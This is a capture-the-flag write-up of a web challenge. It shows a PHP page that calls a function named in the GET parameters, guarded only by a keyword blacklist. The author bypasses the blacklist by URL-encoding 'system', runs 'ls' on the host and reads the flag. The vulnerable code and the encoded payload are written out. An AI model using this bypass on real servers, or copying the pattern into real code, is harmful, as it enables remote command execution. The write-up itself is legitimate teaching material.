
Hello guys, just wake up after 48h of fighting, i will try to make write up for all web task as its all cleaned Here :D

So lets start with this easy task (at least look easy for me  :p) 

First look at robots.txt give us some hint : 
`
http://35.196.45.11:8080/robots.txt
`

give us :

```
# you know de wae ma queen
User-Agent: *
Disallow: /?debug
```

then check 

```
http://35.196.45.11:8080/?debug
```
will show us simple php code , we need to send something like `http://35.196.45.11:8080/system=id` where system is the $key and id is the $val

```
$blacklist = "assert|system|passthru|exec|assert|read|open|eval|`|_|file|dir|\.\.|\/\/|curl|ftp|glob";

if(count($_GET) > 0){
	if(preg_match("/$blacklist/i",$_SERVER["REQUEST_URI"])) die("No no no hackers!!");
	list($key, $val) = each($_GET);
	$key($val);
}
```

almost here all function that can be used filtred (open & read & _ ) will filter also many other function

so here make me stuck here

but my friend mention something that maked this almost done 'encode'
As here the filter work on ```$_SERVER["REQUEST_URI"]``` and the in final step we have ```$_GET``` so if we encode our data it end decoded in   ```each($_GET); ``` but not in ```$_SERVER["REQUEST_URI"]```

So the plan is clear here, encode our data to bypass filter and run any function :D

![image](https://user-images.githubusercontent.com/7364615/35493904-ffb66d3c-04b6-11e8-8c82-25acb5c3c60b.png)

lets try it now :

`http://35.196.45.11:8080/%73%79%73%74%65%6d=ls`

![image](https://user-images.githubusercontent.com/7364615/35493920-219f6c1e-04b7-11e8-8660-9d4e6a53dfcd.png)

Then final step read flag file :D 

![image](https://user-images.githubusercontent.com/7364615/35493934-4ac2221c-04b7-11e8-88c0-5b0ca3caf17b.png)

```
AceBear{I_did_something_stupid_with_url}
```

Thanks guys , will try to make write up (BearShare & BearShare 2 & Tet shopping) ;)

